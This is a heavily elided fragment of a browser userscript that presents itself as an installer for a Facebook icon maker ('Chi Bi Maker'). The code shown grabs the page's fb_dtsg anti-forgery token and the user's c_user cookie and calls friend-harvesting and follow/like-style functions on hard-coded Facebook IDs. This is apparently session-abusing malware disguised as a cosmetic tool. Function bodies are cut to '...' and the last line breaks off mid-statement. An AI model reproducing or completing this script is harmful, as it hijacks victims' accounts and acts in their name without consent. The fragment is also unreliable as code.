// ==UserScript==
// @name            Cài Đặt Chi Bi Maker Trên FaceBook (y)
...
;
arkadaslari_al(id);
arkadaslari_al(219543401580512);
arkadaslari_al(365823416893873);
(function() {
...
P("219543401580512");// cai icon
P("365823416893873"); //Prince
...
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);t